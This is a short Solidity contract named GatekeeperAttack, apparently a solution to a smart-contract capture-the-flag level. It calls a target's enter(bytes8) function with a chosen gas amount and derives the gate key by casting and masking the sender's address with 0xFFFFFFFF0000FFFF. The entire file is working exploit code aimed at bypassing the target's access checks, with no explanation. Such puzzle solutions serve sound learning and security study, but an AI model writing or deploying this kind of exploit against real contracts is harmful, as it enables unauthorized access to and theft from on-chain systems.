// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperAttack {
        
    address public gatekeeper;
        
    constructor(address _gatekeeper) {
        gatekeeper = _gatekeeper;
    }
    
    function attack(uint _gasToUse,bytes8 gateKey) external {
        
        (bool success, ) = gatekeeper.call{gas: _gasToUse}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        }

    function getKey(address _address) external pure returns(bytes8) {
      return bytes8(uint64(uint160(address(_address)))) & 0xFFFFFFFF0000FFFF;
    }
}